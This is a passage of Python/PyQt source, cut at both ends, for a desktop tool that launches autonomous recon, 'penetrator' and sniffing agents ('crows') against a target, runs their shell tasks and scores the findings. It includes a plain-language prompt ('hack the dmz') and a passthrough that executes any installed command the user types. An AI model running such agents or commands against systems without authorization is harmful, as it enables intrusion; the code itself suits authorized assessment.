            f"color: {NEON}; font-size: 13px; border: 1px solid {NEON}; padding: 3px 10px; font-family: monospace;"
        )
        head.addWidget(self.elapsed_lbl)
        self.sev_lbl = QLabel("WATCH")
        self.sev_lbl.setStyleSheet(
            f"color: {SEV_INFO}; font-size: 11px; letter-spacing: 2px; border: 1px solid {SEV_INFO}; padding: 3px 10px;"
        )
        self.sev_lbl.setToolTip("triage severity of this crow's findings — updates live")
        head.addWidget(self.sev_lbl)
        lay.addLayout(head)

        blurb = QLabel(CROW_ROLES[crow["role"]]["blurb"])
        blurb.setObjectName("tooldesc")
        blurb.setWordWrap(True)
        lay.addWidget(blurb)

        ctrl = QHBoxLayout()
        ctrl.setSpacing(8)
        self.btn_run = QPushButton("RELEASE CROW")
        self.btn_run.clicked.connect(lambda: request_run(self))
        ctrl.addWidget(self.btn_run)
        self.btn_stop = QPushButton("CALL BACK")
        self.btn_stop.setObjectName("ghost")
        self.btn_stop.setEnabled(False)
        self.btn_stop.clicked.connect(lambda: request_stop(self))
        ctrl.addWidget(self.btn_stop)
        self.speed_lbl = QLabel()
        self.speed_lbl.setStyleSheet(f"color: {NEON2}; font-size: 11px; letter-spacing: 1px;")
        ctrl.addWidget(self.speed_lbl)
        ctrl.addStretch(1)
        lay.addLayout(ctrl)

        mid = QHBoxLayout()
        mid.setSpacing(12)
        self.task_list = QListWidget()
        self.task_list.setFixedWidth(300)
        for i, (label, _) in enumerate(crow["tasks"], 1):
            item = QListWidgetItem(f"{i:02d}  {label}")
            item.setForeground(QBrush(QColor(MUTED)))
            self.task_list.addItem(item)
        mid.addWidget(self.task_list)

        self.out = QPlainTextEdit()
        self.out.setReadOnly(True)
        self.out.setPlaceholderText(f"{crow['name']} barks here as it works…")
        mid.addWidget(self.out, 1)
        lay.addLayout(mid, 1)

        find_lbl = QLabel("FINDINGS — click a chip to copy it")
        find_lbl.setStyleSheet(f"color: {NEON2}; font-size: 11px; letter-spacing: 1px;")
        lay.addWidget(find_lbl)
        self.findings_wrap = QWidget()
        self.findings_lay = QHBoxLayout(self.findings_wrap)
        self.findings_lay.setContentsMargins(0, 0, 0, 0)
        self.findings_lay.setSpacing(6)
        self.findings_lay.addStretch(1)
        lay.addWidget(self.findings_wrap)

        brief_lbl = QLabel("BRIEFING — plain-English readout of what this crow heard")
        brief_lbl.setStyleSheet(f"color: {NEON}; font-size: 11px; letter-spacing: 1px;")
        lay.addWidget(brief_lbl)
        self.brief = QTextBrowser()
        self.brief.setOpenLinks(False)
        self.brief.setMinimumHeight(260)
        self.brief.setMaximumHeight(700)
        self.brief.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOn)
        self.brief.setStyleSheet(
            "QTextBrowser { background: #050505; border: 1px solid #1e1e1e; color: #d4d4d4; padding: 8px; }"
            "QTextBrowser a { color: #00e5ff; text-decoration: none; }"
        )
        self.brief.anchorClicked.connect(self._think_clicked)
        lay.addWidget(self.brief)

        think_lbl = QLabel("ANALYST READ — TRIAGE: observed · why it matters · the next question")
        think_lbl.setStyleSheet(f"color: {NEON2}; font-size: 11px; letter-spacing: 1px;")
        lay.addWidget(think_lbl)
        self.think = QTextBrowser()
        self.think.setOpenLinks(False)
        self.think.setMinimumHeight(200)
        self.think.setMaximumHeight(460)
        self.think.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOn)
        self.think.setStyleSheet(
            "QTextBrowser { background: #040408; border: 1px solid #242430; color: #c8c8c8; padding: 8px; }"
            "QTextBrowser a { color: #59ffa0; text-decoration: none; }"
        )
        self.think.anchorClicked.connect(self._think_clicked)
        lay.addWidget(self.think)
        self.antidotes = []
        self.esc_records = []
        self.on_verdict = None
        self.known_lookup = None
        self.severity = ("WATCH", 0, SEV_INFO)
        self.verdict = "no telemetry yet."

        self._refresh_elapsed()
        self._refresh_think()

    def refresh_findings(self):
        while self.findings_lay.count() > 1:
            item = self.findings_lay.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
        for f in parse_findings(self.out.toPlainText()):
            if self.findings_lay.count() > 40:
                break
            chip = CopyButton(f, label=f)
            chip.setObjectName("ghost")
            chip.setToolTip(f"click to copy: {f}")
            chip.setStyleSheet("font-size: 11px; padding: 2px 10px;")
            self.findings_lay.insertWidget(self.findings_lay.count() - 1, chip)
        self._refresh_brief()
        self._refresh_think()

    def _refresh_brief(self):
        text = self.out.toPlainText()
        if not text.strip():
            return
        paras = []
        for line in human_brief(text):
            paras.append(f"<p>—&nbsp; {_linkify(line)}</p>")
        self.brief.setHtml("<div style='font-size:12px'>" + "".join(paras) + "</div>")

    def _refresh_think(self):
        text = self.out.toPlainText()
        self.antidotes = []
        self.esc_records = []
        if not text.strip():
            self.severity = ("WATCH", 0, SEV_INFO)
            self.verdict = "no telemetry yet."
            self.sev_lbl.setText("WATCH")
            self.sev_lbl.setStyleSheet(
                f"color: {SEV_INFO}; font-size: 11px; letter-spacing: 2px; border: 1px solid {SEV_INFO}; padding: 3px 10px;"
            )
            self.think.setHtml(
                "<div style='font-size:12px;color:#555'>no signal yet — the triage read renders live as this crow reports.</div>"
            )
            return
        feats = crow_features(text)
        hits = triage(feats)
        annot = []
        for h in hits:
            key = thread_key(h)
            rec = self.known_lookup(key) if (self.known_lookup and key) else None
            annot.append((h, key, rec))
        open_hits = [h for h, _k, r in annot if not r or not r.get("status")]
        in_flight = [h for h, _k, r in annot if r and r.get("status") in ("dispatched", "escalated")]
        if open_hits:
            self.verdict = verdict_of(feats, open_hits, self.crow["role"])
            self.severity = severity_of(open_hits)
        elif in_flight:
            self.verdict = (f"VERDICT IN PROGRESS — {in_flight[0]['what'][:70]} — "
                            f"{[r.get('label') for h, k, r in annot if r][0]} response flying")
            self.severity = ("MEDIUM", 45, SEV_MED)
        else:
            n = sum(1 for _h, _k, r in annot if r and r.get("status"))
            self.verdict = f"VERDICT RESOLVED — {n} flagged item(s) already attributed/closed; nothing new to chase."
            self.severity = ("LOW", 0, SEV_LOW)
        lvl, score, col = self.severity
        self.sev_lbl.setText(f"{lvl} {score}/100")
        self.sev_lbl.setStyleSheet(
            f"color: {col}; font-size: 11px; letter-spacing: 2px; border: 1px solid {col}; padding: 3px 10px;"
        )
        theory = hypothesis(feats, open_hits or hits, self.crow["role"]) if not all(
            ((r or {}).get("status") in ("attributed", "investigated") for _h, _k, r in annot)
        ) else f"{self.crow['role'].upper()} pass complete — every flagged item has been handled."
        parts = [
            f"<div style='font-size:12px;color:{col};border:1px solid {col};padding:6px;'>"
            f"⚠ {self.verdict}</div>",
            f"<div style='font-size:11px;color:#6f6f6f;margin-top:6px'>"
            f"WORKING THEORY &nbsp;//&nbsp; {theory}</div>",
        ]
        for h, key, rec in annot:
            status = (rec or {}).get("status") if rec else None
            hcol = sev_color(h["score"])
            tgt = feats.get("gw") or self.crow["target"]
            label, tasks = antidote_tasks(h, tgt)
            self.antidotes.append((label, tasks, tgt))
            self.esc_records.append(h)
            aidx = len(self.antidotes) - 1
            if status in ("attributed", "investigated"):
                view = (f"<div style='font-size:13px;margin-top:8px;border-left:3px solid {SEV_LOW};padding-left:6px;"
                        f"color:{SEV_LOW}'>✔  {h['what']}  —  RESOLVED  "
                        f"<span style='color:#6f6f6f'>(was {h['score']}/100)</span></div>"
                        f"<div style='font-size:12px;color:#8bc34a;margin-left:9px'>closed: {rec.get('note') or (rec.get('label') or 'handled')}</div>")
            elif status in ("dispatched", "escalated"):
                view = (f"<div style='font-size:13px;margin-top:8px;border-left:3px solid {SEV_MED};padding-left:6px;"
                        f"color:{SEV_MED}'>…  {h['what']}  —  {rec.get('status').upper()}"
                        f" <span style='color:#6f6f6f'>({rec.get('label')} in flight)</span></div>"
                        f"<div style='font-size:12px;color:#a8a8a8;margin-left:9px'>response already dispatched for this one — no duplicate run.</div>")
            else:
                view = f"<div style='font-size:13px;margin-top:8px;border-left:3px solid {hcol};padding-left:6px'>" \
                       f"<a href='ado:{aidx}' style='color:{hcol};text-decoration:none' " \
                       f"title='click to dispatch the {label} response crow'>#{h['rank']}  {h['what']}</a>  " \
                       f"<span style='color:#6f6f6f'>(score {h['score']}/100 · {h['conf']}% conf)</span></div>"
                view += f"<div style='font-size:12px;color:#c8c8c8;margin-left:9px'>why it matters: {h['why']}</div>"
                view += f"<div style='font-size:12px;color:#a0a0a0;margin-left:9px'>next question a senior asks: {h['so']}</div>"
                view += f"<div style='font-size:12px;color:#59ffa0;margin-left:9px'>▶ <a href='ado:{aidx}' " \
                        f"style='color:#59ffa0' title='send a {label} crow: {len(tasks)} probes'>treat: send {label} antidote ({len(tasks)} probes)</a>" \
                        f" &nbsp;·&nbsp; <a href='esc:{aidx}' style='color:#ff5370' " \
                        f"title='raise the field to CRITICAL and dispatch the response'>ESCALATE</a></div>"
            parts.append(view)
        self.think.setHtml("<div style='font-size:12px'>" + "".join(parts) + "</div>")
        if self.on_verdict:
            self.on_verdict()

    def _think_clicked(self, url):
        v = url.toString()
        if v.startswith("ado:"):
            try:
                idx = int(v[len("ado:"):])
                label, tasks, tgt = self.antidotes[idx]
                h = self.esc_records[idx]
            except (ValueError, IndexError):
                return
            if self.request_remedy:
                self.request_remedy(label, tasks, tgt, thread_key(h))
            return
        if v.startswith("esc:"):
            try:
                idx = int(v[len("esc:"):])
            except ValueError:
                return
            if idx >= len(self.esc_records) or not self.escalate_cb:
                return
            h = self.esc_records[idx]
            label, tasks, tgt = self.antidotes[idx] if idx < len(self.antidotes) else ("RESPONSE", [], self.crow["target"])
            self.escalate_cb(
                {"crow": self.crow["name"], "role": self.crow["role"], "target": tgt,
                 "id": h.get("id"), "what": h.get("what", ""), "score": h.get("score", 0),
                 "label": label, "tasks": tasks, "rank": h.get("rank", "#"),
                 "key": thread_key(h)}
            )
            return
        if v.startswith("upx:"):
            QApplication.clipboard().setText(v[len("upx:"):])

    @property
    def running(self):
        return self.crow["state"] == TASK_RUNNING

    def set_state(self, state, detail=""):
        self.crow["state"] = state
        colors = {
            TASK_PENDING: (MUTED, EDGE),
            TASK_RUNNING: (NEON, NEON),
            TASK_DONE: (NEON, EDGE),
            TASK_FAILED: ("#ff5370", "#ff5370"),
            TASK_STOPPED: (NEON2, NEON2),
        }
        fg, border = colors.get(state, (MUTED, EDGE))
        text = state.upper() + (f" — {detail}" if detail else "")
        self.state_lbl.setText(text)
        self.state_lbl.setStyleSheet(
            f"color: {fg}; font-size: 11px; letter-spacing: 2px; border: 1px solid {border}; padding: 3px 10px;"
        )
        if state == TASK_RUNNING:
            self.btn_run.setEnabled(False)
            self.btn_stop.setEnabled(True)
            if not self.started_at:
                self.started_at = time.monotonic()
            self.tick.start()
        else:
            self.btn_run.setEnabled(True)
            self.btn_stop.setEnabled(False)
            self.tick.stop()
            self._refresh_elapsed()
        self._refresh_elapsed()

    def mark_task(self, idx, state):
        self.crow["task_states"][idx] = state
        item = self.task_list.item(idx)
        fg = {TASK_RUNNING: NEON, TASK_DONE: TEXT, TASK_FAILED: "#ff5370"}.get(state, MUTED)
        item.setForeground(QBrush(QColor(fg)))
        base = f"{idx + 1:02d}  {self.crow['tasks'][idx][0]}"
        item.setText(base + ("" if state == TASK_PENDING else f"   [{state}]"))

    def _refresh_elapsed(self):
        if self.started_at is None:
            self.elapsed_lbl.setText("--:--")
            return
        secs = int(time.monotonic() - self.started_at)
        self.elapsed_lbl.setText(f"{secs // 60:02d}:{secs % 60:02d}")
        done = sum(1 for s in self.crow["task_states"] if s in (TASK_DONE, TASK_FAILED))
        if done and secs:
            avg = max(1, secs // done)
            faster = max(1, self.STUDENT_MIN_PER_TASK * 60 // avg)
            self.speed_lbl.setText(
                f"crow {avg}s/task  vs  student ~{self.STUDENT_MIN_PER_TASK}min/task  // x{faster} faster"
            )

    def append(self, data):
        self.out.moveCursor(QTextCursor.MoveOperation.End)
        self.out.insertPlainText(data)
        self.out.moveCursor(QTextCursor.MoveOperation.End)


class CrowPane(QWidget):
    """Spawn and manage crows — autonomous recon / pentest agents."""

    def __init__(self, log, report):
        super().__init__()
        self.log = log
        self.report = report
        self.crows = []
        self.views = {}
        self.active = None
        self.task_idx = 0
        self.task_started = None
        self.escalations = []
        self.threads = {}
        self._pending_thread = None

        self.proc = QProcess(self)
        self.proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)
        self.proc.readyReadStandardOutput.connect(self._drain)
        self.proc.finished.connect(self._task_finished)

        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(12)

        self.watch_lbl = QLabel("FIELD WATCH ▸ WATCH  (0/100)")
        self.watch_lbl.setStyleSheet(
            f"color: {SEV_INFO}; font-size: 13px; letter-spacing: 2px; "
            f"border: 1px solid {SEV_INFO}; padding: 8px 12px; background: #06080c;"
        )
        self.watch_lbl.setToolTip(
            "worst triage verdict across all crows this session — green/safe, amber/suspicious, red/act"
        )
        lay.addWidget(self.watch_lbl)

        ask = QHBoxLayout()
        ask.setSpacing(8)
        ask_lbl = QLabel("ASK RAVEN")
        ask_lbl.setStyleSheet(f"color: {NEON2}; font-size: 11px; letter-spacing: 2px;")
        ask.addWidget(ask_lbl)
        self.ask_edit = QLineEdit()
        self.ask_edit.setPlaceholderText(
            'say it plain — "all eyes on me" · "map 10.0.0.0/24" · "hack the dmz" · "who is on my network"'
        )
        self.ask_edit.returnPressed.connect(self.obey)
        ask.addWidget(self.ask_edit, 1)
        self.btn_ask = QPushButton("GO")
        self.btn_ask.clicked.connect(self.obey)
        ask.addWidget(self.btn_ask)
        lay.addLayout(ask)

        hint = QLabel(
            'examples:  "all eyes on me"  ·  "map my network"  ·  "scan 10.0.0.5"  ·  "clean the lab from 192.168.1.10"'
        )
        hint.setStyleSheet(f"color: {MUTED}; font-size: 11px;")
        lay.addWidget(hint)

        form = QHBoxLayout()
        form.setSpacing(8)
        form.addWidget(QLabel("NAME"))
        self.name_edit = QLineEdit()
        self.name_edit.setPlaceholderText("crow name — e.g. corvus")
        self.name_edit.setMaximumWidth(180)
        form.addWidget(self.name_edit)

        self.role_recon = QPushButton("RECON")
        self.role_recon.setCheckable(True)
        self.role_recon.setChecked(True)
        self.role_pentest = QPushButton("PENETRATOR")
        self.role_pentest.setCheckable(True)
        self.role_sniff = QPushButton("SNIFF")
        self.role_sniff.setCheckable(True)
        self.role_pentest.setAutoExclusive(True)
        self.role_recon.setAutoExclusive(True)
        self.role_sniff.setAutoExclusive(True)
        form.addWidget(self.role_recon)
        form.addWidget(self.role_pentest)
        form.addWidget(self.role_sniff)

        form.addWidget(QLabel("TARGET"))
        self.target_edit = QLineEdit()
        self.target_edit.setPlaceholderText("IP or domain you are authorized to test")
        form.addWidget(self.target_edit, 1)

        self.btn_spawn = QPushButton("SPAWN")
        self.btn_spawn.clicked.connect(self.spawn)
        form.addWidget(self.btn_spawn)
        lay.addLayout(form)

        split = QHBoxLayout()
        split.setSpacing(14)
        self.listw = QListWidget()
        self.listw.setFixedWidth(200)
        self.listw.currentRowChanged.connect(self._show)
        split.addWidget(self.listw)

        self.stack = QStackedWidget()
        split.addWidget(self.stack, 1)
        lay.addLayout(split, 1)

    def _refresh_watch(self):
        """FIELD WATCH — worst severity across every crow this session; escalations pin it red."""
        lvl, score, col = "WATCH", 0, SEV_INFO
        for view in self.views.values():
            v_lvl, v_score, v_col = getattr(view, "severity", ("WATCH", 0, SEV_INFO))
            if v_score > score:
                lvl, score, col = v_lvl, v_score, v_col
        open_esc = [e for e in self.escalations
                    if self.threads.get(e.get("key", "") or "", {}).get("status") in ("dispatched", "escalated")]
        if open_esc:
            top = open_esc[-1]
            lvl, col = "CRITICAL", SEV_CRIT
            if top.get("score", 0) > score:
                score = top["score"]
            self.watch_lbl.setText(f"FIELD WATCH ▸ {lvl}  ({score}/100)  ⚠ {top.get('what', '')[ :60]}")
        else:
            ndone = len(self.escalations)
            suffix = f"  · {ndone} escalated & closed" if ndone else ""
            self.watch_lbl.setText(f"FIELD WATCH ▸ {lvl}  ({score}/100){suffix}")
        self.watch_lbl.setStyleSheet(
            f"color: {col}; font-size: 13px; letter-spacing: 2px; "
            f"border: 1px solid {col}; padding: 8px 12px; background: #06080c;"
        )

    # --- spawning ---------------------------------------------------------
    def spawn(self):
        pass_target = self.target_edit.text().strip()
        custom_cmd = self._pending_custom.pop() if getattr(self, "_pending_custom", []) else None
        if custom_cmd is not None:
            target = pass_target or "127.0.0.1"
            if " " in target and not re.match(r"[^\s]+", target):
                self.report("custom crow needs a single target — refused")
                return
            role = "custom"
            tasks = [(f"custom: {custom_cmd[:48]}", custom_cmd)]
        else:
            target = pass_target
            if not target or " " in target:
                self.report("crow needs a single target (IP or domain) — refused")
                return
            tasks = None
            if getattr(self, "_pending_tasks", None):
                role = self._pending_role or "remedy"
                tasks = self._pending_tasks
                self._pending_tasks = None
                self._pending_role = None
            elif getattr(self, "_pending_role", None):
                role = self._pending_role
                self._pending_role = None
            elif self.role_pentest.isChecked():
                role = "pentest"
            elif self.role_sniff.isChecked():
                role = "sniff"
            else:
                role = "recon"
        base = self.name_edit.text().strip() or f"crow-{len(self.crows) + 1}"
        name = base
        n = 2
        while name in self.crows:
            name = f"{base}-{n}"
            n += 1

        crow = {
            "name": name,
            "role": role,
            "target": target,
            "tasks": tasks or list(CROW_ROLES[role]["tasks"]),
            "task_states": [TASK_PENDING] * (len(tasks or []) or len(CROW_ROLES[role]["tasks"])),
            "state": TASK_PENDING,
        }
        self.crows.append(crow)
        view = CrowView(crow, self.log, self.request_run, self.request_stop, self.request_custom,
                        self.request_remedy, self.escalate)
        view.on_verdict = self._refresh_watch
        view.known_lookup = self.view_known
        self.views[name] = view
        self.stack.addWidget(view)
        self.listw.addItem(f"{name}  [{role[0].upper()}]")
        self.listw.setCurrentRow(len(self.crows) - 1)
        self.name_edit.clear()
        (ROOT / "crow").mkdir(exist_ok=True)
        self.report(f"spawned crow '{name}' ({role}) for {target}")

    def _show(self, row):
        if row >= 0:
            self.stack.setCurrentIndex(row)

    def _view_of(self, crow):
        return self.views[crow["name"]]

    # --- ask raven (plain-language command) ---------------------------------
    def obey(self):
        text = self.ask_edit.text().strip()
        if not text:
            self.report("raven is listening — tell it what you want")
            return

        # direct tool passthrough: "nmap -sT 10.0.0.5" or "whois example.com"
        first = text.split()[0].lstrip("$").strip().lower()
        if first in TOOL_COMMANDS or (shutil.which(first) and " " in text):
            self._pending_custom = getattr(self, "_pending_custom", [])
            self._pending_custom.append(text)
            self.target_edit.setText(self._pick_target(text))
            self.name_edit.setText("")
            self.spawn()
            if self.crows and self.crows[-1]["role"] == "custom":
                view = self._view_of(self.crows[-1])
                self.report(f"raven running your command: {text}")
                self.log(f"[raven] custom '{text}'")
                self.request_run(view)
            self.ask_edit.clear()
            return

        role, target = parse_intent(text)
        auto = target.startswith(("127.", "0.0.0.0")) or re.match(r"\d+\.\d+\.\d+\.\d+/\d+", target)
        self._pending_role = "eyes" if role == "eyes" else None
        self.name_edit.setText("")
        self.target_edit.setText(target)
        if role == "recon":
            self.role_recon.setChecked(True)
        elif role == "pentest":
            self.role_pentest.setChecked(True)
        else:
            self.role_sniff.setChecked(True)
        self.spawn()
        if self.crows:
            view = self._view_of(self.crows[-1])
            if role == "eyes":
                self.report(
                    "raven going FULL EYES ON — segment inventory, service probe, cast eavesdrop, dns/tls "
                    "watch + deep capture, then a color-coded triage verdict"
                    + (" (auto-detected subnet)" if auto else "")
                )
            else:
                self.report(
                    f"raven understood: {role.upper()} crow on {target} — releasing now"
                    + (" (auto-detected subnet)" if auto else "")
                )
            self.log(f"[raven] intent '{text}' -> role={role} target={target}")
            self.request_run(view)
        self.ask_edit.clear()

    def _pick_target(self, text):
        m = IP_RE.search(text)
        if m:
            t = m.group(1)
            if not t.endswith("/"):
                return t
        m = DOMAIN_RE.search(text)
        if m:
            return m.group(1)
        return "127.0.0.1"

    def request_custom(self, cmd, target=""):
        """Spawn a custom crow from a triage 'next step' — same path as obey()'s passthrough."""
        if self.active is not None:
            self.report(f"crow '{self.active['name']}' is still flying — call it back first")
            return
        t = target.strip() or self._pick_target(cmd) or "127.0.0.1"
        if re.match(r"https?://", cmd.strip()):
            t = re.sub(r"^https?://", "", cmd.strip()).split("/")[0]
        self._pending_custom = getattr(self, "_pending_custom", [])
        self._pending_custom.append(cmd)
        self.target_edit.setText(t)
        self.name_edit.setText("")
        self.spawn()
        if self.crows and self.crows[-1]["role"] == "custom":
            view = self._view_of(self.crows[-1])
            self.report(f"raven chasing the thread: {cmd}")
            self.log(f"[raven] triage follow-up '{cmd}' @ {t}")
            self.request_run(view)

    def view_known(self, key):
        """Lookup used by the analyst read to see whether a finding is being handled."""
        return self.threads.get(key) if key else None

    def mark_thread(self, key, status, label="", note=""):
        if not key:
            return
        if key not in self.threads:
            self.threads[key] = {"ts": time.strftime("%H:%M:%S")}
        cur = self.threads[key]
        cur["status"] = status
        if label:
            cur["label"] = label
        if note:
            cur["note"] = note
        self.threads[key] = cur

    def request_remedy(self, label, tasks, target="", key=None):
        """Dispatch an antidote crow to treat a flagged finding."""
        if self.active is not None:
            self.report(f"crow '{self.active['name']}' is still flying — call it back first")
            return
        t = target.strip() or "127.0.0.1"
        if key:
            self.mark_thread(key, "dispatched", label)
        self._pending_role = "remedy"
        self._pending_tasks = tasks
        self._pending_custom = getattr(self, "_pending_custom", [])
        self.target_edit.setText(t)
        self.name_edit.setText("")
        self.spawn()
        if self.crows and self.crows[-1]["role"] == "remedy":
            view = self._view_of(self.crows[-1])
            self._pending_thread = key
            self.report(f"raven dispatching {label} antidote crow ({len(tasks)} probes) @ {t}")
            self.log(f"[raven] antidote {label}: {[c for _, c in tasks]}")
            self.request_run(view)

    def escalate(self, record):
        """Raise a finding to the senior: field goes CRITICAL and the response crow auto-dispatches."""
        key = record.get("key")
        cur = self.threads.get(key) if key else None
        if cur and cur.get("status") in ("dispatched", "escalated", "attributed", "investigated"):
            self.report(f"already handled — {cur.get('note') or cur.get('label')} — nothing new to escalate")
            return
        self.escalations.append(record)
        if key:
            self.mark_thread(key, "escalated", record.get("label", "RESPONSE"), record.get("what", ""))
        self.report(f"⚠ ESCALATED #{record.get('rank')}: {record['what'][:80]} — dispatching {record['label']} response")
        self.log(f"[escalation] crow={record['crow']} id={record['id']} score={record['score']} what='{record['what']}'")
        self._refresh_watch()
        self.request_remedy(record.get("label", "RESPONSE"), record.get("tasks", []), record.get("target", ""), key)

    # --- autopilot engine --------------------------------------------------
    def request_run(self, view):
        if self.active is not None:
            self.report(f"crow '{self.active['name']}' is still flying — call it back first")
            return
        crow = view.crow
        crow["task_states"] = [TASK_PENDING] * len(crow["tasks"])
        for i in range(len(crow["tasks"])):
            view.mark_task(i, TASK_PENDING)
        view.out.clear()
        self.active = crow
        self.task_idx = 0
        view.started_at = None
        view.set_state(TASK_RUNNING)
        self.log(f"[crow:{crow['name']}] released at {crow['target']}")
        self._start_task()

    def request_stop(self, view):
        if self.active is not view.crow:
            return
        crow = view.crow
        crow["state"] = TASK_STOPPED  # blocks _task_finished from advancing the pipeline
        if self.proc.state() != QProcess.ProcessState.NotRunning:
            self.proc.terminate()
        QTimer.singleShot(200, lambda: self._finish_crow(TASK_STOPPED, "called back"))

    def _start_task(self):
        crow = self.active
        if crow is None:
            return
        if self.task_idx >= len(crow["tasks"]):
            self._finish_crow(TASK_DONE)
            return
        view = self._view_of(crow)
        label, template = crow["tasks"][self.task_idx]
        cmd = (
            template.replace("{target}", crow["target"])
            .replace("{name}", crow["name"])
            .replace("{outdir}", str(ROOT / "crow"))
            .replace("{iface}", default_iface())
        )
        crow["current_cmd"] = cmd
        try:
            argv = shlex.split(cmd)
        except ValueError as e:
            view.append(f"!! bad command: {e}\n")
            self._skip_failed()
            return
        if not shutil.which(argv[0]):
            view.append(f"!! {argv[0]} not found — skipping task\n")
            self.log(f"[crow:{crow['name']}] {argv[0]} not found")
            self._skip_failed()
            return
        view.mark_task(self.task_idx, TASK_RUNNING)
        view.append(f"$ {cmd}\n")
        self.log(f"[crow:{crow['name']}] ({label}) $ {cmd}")
        self.task_started = time.monotonic()
        self.proc.start(argv[0], argv[1:])

    def _skip_failed(self):
        crow = self.active
        view = self._view_of(crow)
        view.mark_task(self.task_idx, TASK_FAILED)
        self.task_idx += 1
        QTimer.singleShot(50, self._start_task)

    def _drain(self):
        if self.active is None:
            return
        data = bytes(self.proc.readAllStandardOutput()).decode(errors="replace")
        if data:
            self._view_of(self.active).append(data)

    def _task_finished(self, code, status):
        crow = self.active
        if crow is None:
            return
        view = self._view_of(crow)
        view.append(f"\n[exit {code}]\n")
        dur = time.monotonic() - self.task_started if self.task_started else 0
        state = TASK_DONE if code == 0 else TASK_FAILED
        view.mark_task(self.task_idx, state)
        view.refresh_findings()
        self.log(f"[crow:{crow['name']}] task {self.task_idx + 1} {state} in {dur:.1f}s")
        if crow["state"] != TASK_RUNNING:
            return
        self.task_idx += 1
        QTimer.singleShot(50, self._start_task)

    def _finish_crow(self, state, detail=""):
        crow = self.active
        if crow is None:
            return
        view = self._view_of(crow)
        failed = sum(1 for s in crow["task_states"] if s == TASK_FAILED)
        done = sum(1 for s in crow["task_states"] if s == TASK_DONE)
        secs = int(time.monotonic() - view.started_at) if view.started_at else 0
        if state == TASK_DONE:
            detail = f"{done}/{len(crow['tasks'])} tasks in {secs // 60}:{secs % 60:02d}"
            view.append(f"\nCROW RETURNED — {detail}" + (f", {failed} failed" if failed else "") + "\n")
        else:
            view.append("\nCROW CALLED BACK — partial results kept\n")
        view.set_state(state, detail)
        self.log(f"[crow:{crow['name']}] {state} — {detail or 'stopped'}")
        self.active = None
        self.task_started = None
        self.report(f"crow '{crow['name']}': {state} {detail}".strip())
        save_crow_report(crow, view, self.log)
        self._close_thread(crow, view)
        self._refresh_watch()
        freed = prune_crow_dir()
        if freed:
            self.log(f"[crow] pruned {freed / 1024 / 1024:.1f} MB of old evidence")

    def _close_thread(self, crow, view):
        """When a remedy crow returns, fold its evidence back into the case thread
        so the same finding stops re-suggesting itself: escalate once, then it's closed."""
        if crow["role"] != "remedy" or not self._pending_thread:
            return
        key = self._pending_thread
        feats = crow_features(view.out.toPlainText())
        pieces = []
        if feats.get("whois") and feats["whois"].get("registrar"):
            pieces.append(f"registered via {feats['whois']['registrar']}")
            if feats["whois"].get("created"):
                pieces.append(f"since {feats['whois']['created'].split('T')[0]}")
        if feats.get("web"):
            if "cloudflare" in (feats["web"].get("server") or "").lower():
                pieces.append("Cloudflare edge (origin hidden)")
            pieces.append(f"HTTP {feats['web'].get('status', '?')}")
        if feats.get("dig") and feats["dig"].get("ns"):
            pieces.append("dns via " + ", ".join(sorted(set(feats["dig"]["ns"]))[:2]))
        cur = self.threads.get(key, {})
        if pieces:
            cur["status"] = "attributed"
            cur["label"] = cur.get("label", "RESPONSE")
            cur["note"] = "; ".join(pieces)
        else:
            cur.setdefault("status", "investigated")
            cur.setdefault("label", "RESPONSE")
            cur.setdefault("note", "remedy ran — evidence captured, no writable attribution")
        self.threads[key] = cur
        self._pending_thread = None
        self.log(f"[thread] {key} -> {cur['status']}: {cur.get('note', '')}")
        view.refresh_findings()


def prune_crow_dir(max_mb=200):
    """Keep crow/ evidence under max_mb by deleting oldest non-report artifacts."""
    d = ROOT / "crow"
    if not d.exists():
        return 0
    files = []
    total = 0
    for f in d.iterdir():
        if f.is_file():
            sz = f.stat().st_size
            total += sz
            files.append((f.stat().st_mtime, f, sz))
    if total <= max_mb * 1024 * 1024:
        return 0
    files.sort()
    freed = 0
    for _, f, sz in files:
        if total <= max_mb * 1024 * 1024:
            break
        if f.name.endswith(".txt"):
            continue
        try:
            f.unlink()
            freed += sz
            total -= sz
        except OSError:
            pass
    return freed


def save_crow_report(crow, view, log):
    """Write a human-readable evidence file for a finished crow into crow/."""
    d = (ROOT / "crow")
    d.mkdir(exist_ok=True)
    name = crow["name"]
    path = d / f"{name}_report.txt"
    try:
        lines = []
        lines.append(f"RAVEN CROW REPORT — {name}")
        lines.append(f"role: {crow['role']}   target: {crow['target']}")
        for i, (label, _) in enumerate(crow["tasks"], 1):
            st = crow["task_states"][i - 1]
            lines.append(f"  task {i:02d} [{st}] {label}")
        brief = view.brief.toPlainText().strip()
        if brief:
            lines.append("")
            lines.append("BRIEFING")
            for b in brief.splitlines():
                lines.append("  " + b)
        think = view.think.toPlainText().strip() if hasattr(view, "think") else ""
        if think:
            lines.append("")
            lines.append("TRIAGE")
            for b in think.splitlines():
                lines.append("  " + b)
        out = view.out.toPlainText().strip()
        if out:
            lines.append("")
            lines.append("TRANSCRIPT (tail 60 lines)")
            for b in out.splitlines()[-60:]:
                lines.append("  " + b)
        path.write_text("\n".join(lines), encoding="utf-8", errors="replace")
        log(f"[crow:{name}] evidence saved to {path.name}")
    except OSError as e:
        log(f"[crow:{name}] could not write report: {e}")


TERMINALS = {
    "kitty": lambda: ["kitty", "--directory", str(ROOT), "opencode"],
    "alacritty": lambda: ["alacritty", "--working-directory", str(ROOT), "-e", "opencode"],
    "foot": lambda: ["foot", "--working-directory", str(ROOT), "opencode"],
    "konsole": lambda: ["konsole", "--workdir", str(ROOT), "-e", "opencode"],
    "xfce4-terminal": lambda: ["xfce4-terminal", f"--working-directory={ROOT}", "-e", "opencode"],
    "gnome-terminal": lambda: ["gnome-terminal", f"--working-directory={ROOT}", "--", "opencode"],
    "wezterm": lambda: ["wezterm", "start", "--cwd", str(ROOT), "--", "opencode"],
    "terminator": lambda: ["terminator", "--working-directory", str(ROOT), "-e", "opencode"],
    "lxterminal": lambda: ["lxterminal", "-e", "opencode"],
    "qterminal": lambda: ["qterminal", "--workdir", str(ROOT), "-e", "opencode"],
    "xterm": lambda: ["xterm", "-e", "opencode"],
}


def default_iface():
    try:
        out = subprocess.run(
